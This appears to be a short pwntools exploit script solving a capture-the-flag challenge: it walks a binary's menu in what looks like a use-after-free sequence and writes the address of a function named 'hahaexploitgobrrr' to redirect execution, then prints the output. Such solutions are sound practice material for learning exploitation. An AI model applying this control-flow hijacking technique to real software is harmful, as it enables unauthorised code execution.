from pwn import (
    args,
    gdb,
    remote,
    process,
    p32,
    ELF,
    context,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"
context.terminal = "kitty"

io = start()

io.sendlineafter(b"(e)xit\n", b"I")
io.sendlineafter(b"\n", b"Y")

io.sendlineafter(b"(e)xit\n", b"L")
io.sendlineafter(b"try anyways:\n", p32(elf.sym["hahaexploitgobrrr"]))

print(io.recvline().decode().strip())
